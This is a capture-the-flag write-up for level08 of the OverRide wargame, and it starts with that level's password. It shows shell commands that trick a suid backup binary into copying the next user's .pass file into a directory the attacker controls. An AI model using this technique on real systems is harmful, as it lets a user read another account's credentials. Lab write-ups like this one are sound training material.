Authenticating as level08/7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

We come across a suid binary named level08.

After analyzing the binary is seems that it takes an argument (filename)
Then tries to copy that file in the backups folder.

The thought about this is easy, we only have to think of how to make the binary reads
the .pass filename that contains the password for the next level.

What I did is I tried to put the path to .pass but the only problem here is that. The binary tries to open that file
in the backups folder but it fails to.

So i created the path ./backups//home/users/level09/.pass in the backups folder and then I executed the binary with that path

level08@OverRide:/tmp$ mkdir ./backups//home/users
level08@OverRide:/tmp$ mkdir ./backups//home/users/level09
level08@OverRide:/tmp$ touch ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ rm -rf ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass

And Here it is, the password for level09.
